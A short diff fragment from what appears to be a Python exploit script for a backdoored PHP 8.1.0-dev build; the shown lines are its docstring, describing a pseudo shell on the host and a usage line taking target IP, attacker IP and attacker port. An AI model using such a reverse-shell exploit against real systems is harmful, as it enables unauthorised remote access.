@@ -22,7 +22,6 @@ The following exploit uses the backdoor to provide a pseudo shell ont the host.
 
 Usage:
   python3 revshell_php_8.1.0-dev.py <target-ip> <attacker-ip> <attacker-port>
-
 """
 
 #!/usr/bin/env python3
